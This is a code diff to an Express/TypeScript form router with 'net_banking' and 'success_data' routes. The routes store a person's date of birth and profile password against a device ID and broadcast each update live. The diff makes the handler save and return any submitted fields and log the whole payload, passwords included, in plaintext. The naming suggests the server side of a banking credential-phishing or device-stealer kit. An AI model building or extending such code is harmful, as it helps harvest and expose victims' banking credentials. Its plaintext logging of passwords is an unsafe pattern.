@@ -141,27 +141,23 @@ router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) 
   }
 });
 
-/* ================= GET SUCCESS DATA ================= */
+/* ================= GET SUCCESS DATA (FLEXIBLE) ================= */
 router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const doc = await FormSubmission.findOne({
       uniqueid: req.params.uniqueid,
     }).lean();
 
-    if (!doc) return res.json({ dob: "", profilePassword: "" });
+    if (!doc) return res.json({});
 
-    const payload = doc.payload || {};
-    return res.json({
-      dob: payload.dob || "",
-      profilePassword: payload.profilePassword || "",
-    });
+    return res.json(doc.payload || {});
   } catch (err: any) {
     logger.error("forms: success_data fetch failed", err);
     return res.status(500).json({});
   }
 });
 
-/* ================= POST: SUCCESS DATA ================= */
+/* ================= POST: SUCCESS DATA (FLEXIBLE) ================= */
 router.post("/success_data", async (req: Request, res: Response) => {
   const body = req.body || {};
   const uniqueid = body.uniqueid || "";
@@ -171,41 +167,50 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 
   try {
+    const payloadToSave = { ...body };
+    delete payloadToSave.uniqueid;
+
     logger.info("forms: success_data payload", {
       uniqueid,
-      dob: body.dob,
-      profilePassword: body.profilePassword,
+      keys: Object.keys(payloadToSave),
+      payload: payloadToSave,
     });
 
-    const update: any = { $set: {} };
-    if (Object.prototype.hasOwnProperty.call(body, "dob")) {
-      update.$set["payload.dob"] = body.dob ?? "";
-    }
-    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
-      update.$set["payload.profilePassword"] = body.profilePassword ?? "";
-    }
-
-    if (Object.keys(update.$set).length === 0) {
-      logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
+    if (Object.keys(payloadToSave).length === 0) {
+      logger.warn("forms: success_data called with no payload fields", { uniqueid });
       return res.json({ success: true });
     }
 
-    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
+    const update: any = {
+      $set: {
+        uniqueid,
+        ...Object.fromEntries(
+          Object.entries(payloadToSave).map(([key, value]) => [`payload.${key}`, value ?? ""])
+        ),
+      },
+    };
+
+    await FormSubmission.findOneAndUpdate(
+      { uniqueid },
+      update,
+      { upsert: true, new: true }
+    );
 
     try {
       wsService.broadcastFormUpdate(uniqueid, {
         uniqueid,
-        dob: Object.prototype.hasOwnProperty.call(body, "dob") ? body.dob ?? "" : undefined,
-        profilePassword: Object.prototype.hasOwnProperty.call(body, "profilePassword")
-          ? body.profilePassword ?? ""
-          : undefined,
+        ...payloadToSave,
         updatedAt: Date.now(),
       });
     } catch (e) {
       logger.warn("forms: broadcast form:update failed", e);
     }
 
-    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
+    logger.info("forms: success_data updated", {
+      uniqueid,
+      changes: Object.keys(payloadToSave),
+    });
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: success_data failed", err);
